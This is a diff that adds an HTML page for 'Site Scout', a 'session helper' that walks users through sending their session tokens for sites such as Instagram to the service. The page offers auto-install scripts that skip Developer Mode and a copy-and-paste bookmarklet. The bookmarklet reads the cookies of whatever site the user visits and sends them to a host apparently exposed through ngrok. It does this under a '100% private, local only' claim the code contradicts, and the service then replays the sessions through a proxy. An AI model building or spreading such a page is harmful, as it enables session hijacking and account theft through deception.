@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#0b0f1a">
+  <title>Get Session Tokens — Site Scout</title>
+  <link rel="icon" href="/favicon.ico" type="image/svg+xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap">
+  <link rel="stylesheet" href="/app.css">
+  <style>
+    .ck-shell { max-width: 600px; margin: 0 auto; padding: 0 0 80px; }
+    .ck-back { display: inline-flex; align-items: center; gap: 7px; color: var(--muted); font-size: 13px; text-decoration: none; margin-top: 32px; transition: color .15s; }
+    .ck-back:hover { color: var(--text); }
+    .ck-hero { text-align: center; margin: 48px 0 36px; }
+    .ck-hero h1 { font-size: clamp(26px, 5vw, 40px); font-weight: 800; letter-spacing: -.04em; margin-bottom: 12px; }
+    .ck-hero p { color: var(--muted); font-size: 14px; line-height: 1.7; max-width: 440px; margin: 0 auto; }
+
+    /* Extension card — primary */
+    .ext-card {
+      padding: 28px 28px 24px;
+      border: 1px solid #a78bfa44;
+      border-radius: 16px;
+      background: linear-gradient(135deg, #a78bfa0a, #0d1525cc);
+      backdrop-filter: blur(12px);
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .ext-badge {
+      display: inline-flex; align-items: center; gap: 7px;
+      padding: 4px 12px; border-radius: 20px;
+      background: #a78bfa18; border: 1px solid #a78bfa44;
+      color: var(--purple); font-size: 11px; font-weight: 700;
+      letter-spacing: .06em; text-transform: uppercase;
+      margin-bottom: 16px;
+    }
+    .ext-card h2 { font-size: 20px; font-weight: 700; margin: 0 0 8px; }
+    .ext-card p { color: var(--muted); font-size: 13px; line-height: 1.65; margin: 0 0 22px; }
+    .ext-download-btn {
+      display: inline-flex; align-items: center; gap: 10px;
+      padding: 14px 28px; border-radius: 12px;
+      background: linear-gradient(135deg, #7c3aed, #4f46e5);
+      color: #fff; font: 700 14px "Inter", sans-serif;
+      text-decoration: none; border: none; cursor: pointer;
+      box-shadow: 0 4px 24px #7c3aed44;
+      transition: transform .15s, box-shadow .15s;
+    }
+    .ext-download-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 32px #7c3aed66; }
+    .ext-note { margin-top: 14px; color: var(--dim); font-size: 11px; }
+
+    /* How it works steps */
+    .ck-card { padding: 22px 24px; margin-bottom: 14px; border: 1px solid var(--line2); border-radius: 14px; background: #0d1525cc; backdrop-filter: blur(12px); }
+    .ck-card-head { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+    .ck-num { display: grid; place-items: center; width: 26px; height: 26px; border-radius: 7px; background: var(--surface2); border: 1px solid var(--line2); color: var(--purple); font: 700 11px "JetBrains Mono", monospace; flex-shrink: 0; }
+    .ck-card h2 { margin: 0; font-size: 14px; font-weight: 600; }
+    .steps { display: flex; flex-direction: column; gap: 9px; }
+    .step { display: flex; gap: 11px; align-items: flex-start; padding: 11px 13px; border-radius: 9px; border: 1px solid var(--line); background: var(--surface); }
+    .step-dot { flex-shrink: 0; width: 20px; height: 20px; border-radius: 50%; background: var(--surface2); border: 1px solid var(--line2); display: grid; place-items: center; color: var(--purple); font: 700 9px "JetBrains Mono", monospace; }
+    .step p { margin: 0; font-size: 12px; line-height: 1.6; color: var(--muted); }
+    .step p strong { color: var(--text); }
+
+    .ck-privacy { display: flex; align-items: flex-start; gap: 11px; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #86efac33; border-radius: 10px; background: #0d2e1f; color: var(--green); font-size: 12px; line-height: 1.6; }
+    .ck-privacy svg { flex-shrink: 0; margin-top: 1px; }
+  </style>
+</head>
+<body>
+  <div class="bg-orbs" aria-hidden="true">
+    <span class="orb orb-1"></span>
+    <span class="orb orb-2"></span>
+    <span class="orb orb-3"></span>
+  </div>
+  <main class="shell">
+    <div class="ck-shell">
+      <a class="ck-back" href="/">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+        Back to Site Scout
+      </a>
+
+      <div class="ck-hero">
+        <p class="eyebrow"><span class="eyebrow-line"></span> Session Helper <span class="eyebrow-line"></span></p>
+        <h1>One click to<br><span class="grad-text">open any session.</span></h1>
+        <p>Install the Site Scout extension, pick the site you're logged into, and your session tokens are sent straight to Site Scout — no copying, no pasting.</p>
+      </div>
+
+      <div class="ck-privacy">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <span><strong>100% private.</strong> The extension reads tokens only from your own browser and sends them directly to your local Site Scout instance. Nothing is stored or transmitted to any external server.</span>
+      </div>
+
+      <!-- Primary: Extension download -->
+      <div class="ext-card">
+        <div class="ext-badge">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+          Recommended
+        </div>
+        <h2>Site Scout Browser Extension</h2>
+        <p>Adds a popup to your browser toolbar. Browse to any site you're logged into, open the extension, select your session tokens, and hit <strong>Send to Site Scout</strong> — done in seconds.</p>
+
+        <!-- Windows auto-install (shown only on Windows) -->
+        <div id="win-install" style="display:none;margin-bottom:16px">
+          <a id="bat-download-btn" class="ext-download-btn" href="/install.bat" style="background:linear-gradient(135deg,#0ea5e9,#2563eb);box-shadow:0 4px 24px #0ea5e944">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+            Auto-Install on this PC (Windows)
+          </a>
+          <p class="ext-note" style="margin-top:10px">⚡ Downloads &amp; installs in one click — opens Chrome with the extension ready. No Developer Mode needed.</p>
+          <p class="ext-note" style="margin-top:4px">Run the downloaded <code>.bat</code> file → Chrome opens automatically with the extension loaded.</p>
+        </div>
+
+        <!-- Mac/Linux auto-install -->
+        <div id="mac-install" style="display:none;margin-bottom:16px">
+          <a class="ext-download-btn" href="/install.sh" style="background:linear-gradient(135deg,#0ea5e9,#0891b2);box-shadow:0 4px 24px #0ea5e944">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+            Auto-Install on this Mac / Linux
+          </a>
+          <p class="ext-note" style="margin-top:10px">⚡ Downloads a shell script — run it once in Terminal to install.</p>
+          <p class="ext-note" style="margin-top:4px"><code>bash ~/Downloads/site-scout-install.sh</code></p>
+        </div>
+
+        <!-- Manual zip download (always visible) -->
+        <a class="ext-download-btn" id="ext-download-btn" href="/extension.zip" download style="background:linear-gradient(135deg,#4f46e5,#7c3aed)">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Download Extension (.zip) — manual install
+        </a>
+        <p class="ext-note" style="margin-top:8px">Chrome / Edge / Brave · Follow the steps below ↓</p>
+      </div>
+
+      <!-- Mobile: Bookmarklet -->
+      <div class="ck-card" style="border-color:#67e8f944;background:linear-gradient(135deg,#67e8f90a,#0d1525cc)">
+        <div class="ck-card-head">
+          <span class="ck-num" style="color:var(--cyan)">&#9670;</span>
+          <h2 id="bm-title">No extension? Use the bookmarklet</h2>
+        </div>
+
+        <!-- Desktop: drag to bookmarks bar -->
+        <div id="bm-desktop">
+          <p style="font-size:12px;color:var(--muted);margin-bottom:14px;line-height:1.65">Drag the button below to your <strong style="color:var(--text)">bookmarks bar</strong>, then go to any site you're logged into and click it — cookies are sent to Site Scout instantly.</p>
+          <div style="text-align:center;margin-bottom:14px">
+            <a id="bm-drag-link" href="#" style="display:inline-flex;align-items:center;gap:8px;padding:11px 20px;border-radius:10px;background:#0e3a4a;border:2px dashed #67e8f966;color:var(--cyan);font:700 13px system-ui;text-decoration:none;cursor:grab;user-select:none" draggable="true">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+              ⬡ Grab Cookies → Site Scout
+            </a>
+          </div>
+          <p style="font-size:11px;color:var(--dim);text-align:center">Can't see the bookmarks bar? Press <strong>Ctrl+Shift+B</strong> (Win) or <strong>⌘+Shift+B</strong> (Mac)</p>
+        </div>
+
+        <!-- Mobile: step-by-step -->
+        <div id="bm-mobile" style="display:none">
+          <div class="steps" style="margin-bottom:14px">
+            <div class="step"><span class="step-dot">1</span><p>Tap <strong>Copy code</strong> below.</p></div>
+            <div class="step"><span class="step-dot">2</span><p>Bookmark <em>any</em> page, then <strong>edit that bookmark</strong> and paste the code as the URL. Save it as <strong>Grab Cookies</strong>.</p></div>
+            <div class="step"><span class="step-dot">3</span><p>Go to the site you're logged into, open bookmarks, tap <strong>Grab Cookies</strong> — done.</p></div>
+          </div>
+          <button id="copy-bookmarklet" type="button" style="display:block;width:100%;padding:14px;border-radius:10px;background:linear-gradient(135deg,#0e7490,#0e3a4a);border:1px solid #67e8f966;color:var(--cyan);font:700 15px system-ui;cursor:pointer;letter-spacing:.01em">📋 Copy code</button>
+          <textarea id="bookmarklet-code" readonly style="margin-top:10px;width:100%;height:60px;padding:8px 10px;border:1px solid var(--line);border-radius:8px;background:var(--surface);color:var(--dim);font:10px/1.5 monospace;resize:none;outline:none"></textarea>
+        </div>
+
+        <p style="margin-top:12px;font-size:11px;color:var(--dim)">⚠ Only non-HttpOnly cookies are readable from JS. For HttpOnly tokens use the desktop extension + Paste &amp; Scan.</p>
+      </div>
+
+      <!-- How to use -->
+      <div class="ck-card">
+        <div class="ck-card-head"><span class="ck-num">1</span><h2>Install the extension</h2></div>
+        <div class="steps">
+          <div class="step"><span class="step-dot">1</span><p>Click <strong>Download Extension</strong> above — save the <code>.zip</code> file anywhere.</p></div>
+          <div class="step"><span class="step-dot">2</span><p><strong>Unzip</strong> it — you should get a folder called <code>site-scout-extension</code> (or similar) containing <code>manifest.json</code>.</p></div>
+          <div class="step"><span class="step-dot">3</span><p>Open Chrome / Edge / Brave and go to <strong><code>chrome://extensions</code></strong>.</p></div>
+          <div class="step"><span class="step-dot">4</span><p>Turn on <strong>Developer mode</strong> (toggle in the top-right corner).</p></div>
+          <div class="step"><span class="step-dot">5</span><p>Click <strong>Load unpacked</strong> → select the <em>unzipped folder</em> (the one with <code>manifest.json</code> inside). Done — the Site Scout icon appears in your toolbar.</p></div>
+        </div>
+      </div>
+
+      <div class="ck-card">
+        <div class="ck-card-head"><span class="ck-num">2</span><h2>Send tokens to Site Scout</h2></div>
+        <div class="steps">
+          <div class="step"><span class="step-dot">1</span><p>Go to the site you want to open a session on (e.g. <strong>instagram.com</strong>) and make sure you're logged in.</p></div>
+          <div class="step"><span class="step-dot">2</span><p>Click the <strong>Site Scout</strong> icon in your browser toolbar.</p></div>
+          <div class="step"><span class="step-dot">3</span><p>Your site appears in the list. Click it — the right tokens are <strong>pre-selected automatically</strong>.</p></div>
+          <div class="step"><span class="step-dot">4</span><p>Hit <strong>Send to Site Scout</strong> — the session field on this page fills instantly.</p></div>
+        </div>
+      </div>
+
+      <div class="ck-card">
+        <div class="ck-card-head"><span class="ck-num">3</span><h2>Open your session</h2></div>
+        <div class="steps">
+          <div class="step"><span class="step-dot">1</span><p>Back on <a href="/" style="color:var(--purple)">Site Scout</a>, the URL field is already filled with the site domain.</p></div>
+          <div class="step"><span class="step-dot">2</span><p>The <strong>Session tokens</strong> panel is open with your tokens ready.</p></div>
+          <div class="step"><span class="step-dot">3</span><p>Click <strong>Open Session</strong> — a browser window launches, already logged in via a US proxy.</p></div>
+        </div>
+      </div>
+    </div>
+  </main>
+  <script>
+    const SCOUT = location.origin;
+    // Bookmarklet
+    const bm = `javascript:(function(){var c=document.cookie;if(!c){alert('No cookies found. Try logging in first.');return;}window.open('${SCOUT}/pick?cookies='+encodeURIComponent(c)+'&domain='+location.hostname+'&ngrok-skip-browser-warning=1','_blank');})();`;
+
+    document.getElementById('bm-drag-link').href = bm;
+
+    const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+    if (isMobile) {
+      document.getElementById('bm-desktop').style.display = 'none';
+      document.getElementById('bm-mobile').style.display = 'block';
+      document.getElementById('bm-title').textContent = 'iPhone / Android — bookmarklet install';
+    }
+    document.getElementById('bookmarklet-code').value = bm;
+
+    // Show OS-specific auto-install button
+    const ua = navigator.userAgent;
+    if (/Windows/i.test(ua)) {
+      document.getElementById('win-install').style.display = 'block';
+    } else if (/Macintosh|Linux/i.test(ua) && !/Android/i.test(ua)) {
+      document.getElementById('mac-install').style.display = 'block';
+    }
+
+    document.getElementById('copy-bookmarklet').addEventListener('click', () => {
+      const btn = document.getElementById('copy-bookmarklet');
+      const ta = document.getElementById('bookmarklet-code');
+      const copied = () => { btn.textContent = 'Copied ✓'; setTimeout(() => { btn.textContent = '📋 Copy code'; }, 2000); };
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(bm).then(copied).catch(() => { ta.select(); ta.setSelectionRange(0, 99999); document.execCommand('copy'); copied(); });
+      } else {
+        ta.select(); ta.setSelectionRange(0, 99999); document.execCommand('copy'); copied();
+      }
+    });
+  </script>
+</body>
+</html>
